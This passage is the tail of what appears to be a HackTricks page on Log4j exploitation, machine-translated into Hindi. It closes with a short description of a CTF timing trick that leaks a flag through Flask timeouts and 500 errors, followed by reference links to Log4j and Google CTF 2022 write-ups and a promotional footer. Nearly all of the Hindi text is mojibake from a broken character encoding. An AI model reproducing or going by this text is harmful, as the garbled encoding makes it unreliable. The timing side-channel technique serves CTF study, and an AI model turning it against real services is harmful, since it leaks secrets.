рдмрд╛рд░** рджреЛрд╣рд░рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдХреБрд▓ ` 29*54*54^6* =`` `` `**`96816014208`  `#`-s!** рд╣реЛрддреЗ рд╣реИрдВред
>
> рдЗрддрдиреЗ рд╕рд╛рд░реЗ `#`-s рдХреЛ рдмрджрд▓рдиреЗ рд╕реЗ Flask рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХрд╛ 10 рд╕реЗрдХрдВрдб рдХрд╛ рдЯрд╛рдЗрдордЖрдЙрдЯ рдЯреНрд░рд┐рдЧрд░ рд╣реЛрдЧрд╛, рдЬрд┐рд╕рд╕реЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЗрдВ HTTP рд╕реНрдерд┐рддрд┐ рдХреЛрдб 500 рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рднреЗрдЬрд╛ рдЬрд╛рдПрдЧрд╛ред (рдпрджрд┐ рдлреНрд▓реИрдЧ `flagGuess` рд╕реЗ рд╢реБрд░реВ рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИ, рд╣рдореЗрдВ рдЧреИрд░-500 рд╕реНрдерд┐рддрд┐ рдХреЛрдб рдкреНрд░рд╛рдкреНрдд рд╣реЛрдЧрд╛)

## рд╕рдВрджрд░реНрдн

* [https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/](https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/)
* [https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/](https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/)
* [https://www.youtube.com/watch?v=XG14EstTgQ4](https://www.youtube.com/watch?v=XG14EstTgQ4)
* [https://tryhackme.com/room/solar](https://tryhackme.com/room/solar)
* [https://www.youtube.com/watch?v=Y8a5nB-vy78](https://www.youtube.com/watch?v=Y8a5nB-vy78)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)
* [https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/)
* [https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/](https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

рд╡рд┐рд╢реЗрд╖рддрд╛рдПрдВ

* [**тШБя╕П HackTricks Cloud тШБя╕П**](https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology) - [**ЁЯРж Twitter ЁЯРж**](https://twitter.com/hacktricks_live) - [**ЁЯОЩя╕П Twitch ЁЯОЩя╕П**](https://www.twitch.tv/hacktricks_live/schedule) - [**ЁЯОе Youtube ЁЯОе**](https://www.youtube.com/@hacktricks_LIVE)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks** рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди рдХреАред
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ **рд╢рд╛рдорд┐рд▓** рд╣реЛрдВ рдпрд╛ рдореБрдЭреЗ **Twitter** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)** рдХрд╛** **рдЕрдиреБрд╕рд░рдг** рдХрд░реЗрдВред**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, PRs рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдореЗрдВ рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред**

</details>
